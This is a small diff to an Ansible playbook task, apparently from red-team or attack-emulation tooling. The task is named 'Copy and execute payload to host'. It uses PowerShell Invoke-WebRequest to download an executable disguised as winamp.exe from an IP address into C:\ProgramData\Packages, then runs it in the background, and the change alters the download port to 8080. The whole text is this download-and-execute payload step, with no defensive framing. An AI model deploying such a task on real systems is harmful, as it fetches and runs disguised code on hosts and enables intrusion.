@@ -1,6 +1,6 @@
 - name: Copy and execute payload to host
   ansible.windows.win_shell: |
-    Invoke-WebRequest -uri http://10.96.11.9/winamp.exe -OutFile C:\ProgramData\Packages\winamp.exe
+    Invoke-WebRequest -uri http://10.96.11.9:8080/winamp.exe -OutFile C:\ProgramData\Packages\winamp.exe
     C:\ProgramData\Packages\winamp.exe
   async: 10
   poll: 0
